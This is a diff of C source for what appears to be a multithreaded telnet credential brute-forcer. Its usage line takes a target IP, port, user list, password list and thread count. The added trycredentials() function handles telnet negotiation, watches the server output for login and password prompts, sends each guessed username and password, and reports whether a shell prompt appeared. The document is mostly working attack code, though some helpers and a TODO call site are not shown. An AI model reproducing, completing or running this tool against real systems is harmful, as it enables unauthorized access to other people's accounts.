@@ -61,6 +61,7 @@
 #include <netinet/in.h>
 #include <string.h>
 #include <pthread.h>
+#include <time.h>
 
 void print_usage(char* pname) {
 	printf("\nUsage: %s <target ip> <port> <userfile> <passfile> <n thread> [options]\n\n"
@@ -237,12 +238,72 @@ void* t_conn(void* t_args) {
 		return NULL;
 	}
 
-	//TODO:if (!try_credentials())
+	//TODO:if (!trycredentials())
 	tdata->tforked = 0;
 
 	pthread_exit(NULL);
 }
 
 uint8_t trycredentials(int sockfd, char *username, char *password) {
+	struct timeval tval;
+	tval.tv_sec = 1;
+	tval.tv_usec = 0;
+	unsigned char buf[BUFLEN + 1];
+	unsigned char buff_r[BUFF_R_SIZE];
+	ssize_t rc;
+	int level, flag = 0;
+	fd_set fds;
+	int selected_fds;
 
+	bzero(buff_r, BUFF_R_SIZE);
+
+	while (1) {
+		FD_ZERO(&fds);
+		FD_SET(sockfd, &fds);
+		FD_SET(0, &fds);
+		
+		// wait for fds to be ready for reading
+		if ( (selected_fds = select(sockfd + 1, &fds, (fd_set*) 0, (fd_set*) 0, &tval)) < 0) {
+			perror("select error\n");
+			return 1;
+		}
+
+		else if (sockfd != 0 && FD_ISSET(sockfd, &fds)) {
+			if (!(rc = receive(sockfd, buf, 1, 0))) {
+				printf("Connection closed by local host!\n");
+				return 2;
+			}
+
+			if (buf[0] == CMD) {
+				if(!(rc = receive(sockfd, (buf + 1), 2, 0))) {
+					printf("Connection closed by the remote host!\n");
+					return 2;
+				}
+				negotiate(sockfd, buf, 3);
+			} else {
+				buf[1] = '\0';
+				printf("%s", buf); // DEBUG
+				
+				if (strlen((const char*) buff_r) < (BUFF_R_SIZE - 2))
+					strcat((char*)buff_r, (const char*) buf);
+				else
+					printf("[ERROR] Overload of buff_r for parsing! Resizing BUFF_R_SIZE might be necessary.");
+				fflush(0);
+			}
+		} else if (!(FD_ISSET(sockfd, &fds))) {
+			if ((level = parse((char*)buff_r, flag)) > 0){
+				switch(level) {
+					case 1: { sendch(sockfd, username); break; } // send login
+					case 2: { sendch(sockfd, password); break; } // send password
+					case 3: return 0; // got prompt :)
+					default: break;
+				}
+				flag = level;
+			} else {
+				if (parse((char*)buff_r, 3) == 4) {
+					return 1; // bad creds, no login :/
+				}
+			}
+		}
+	}
 }
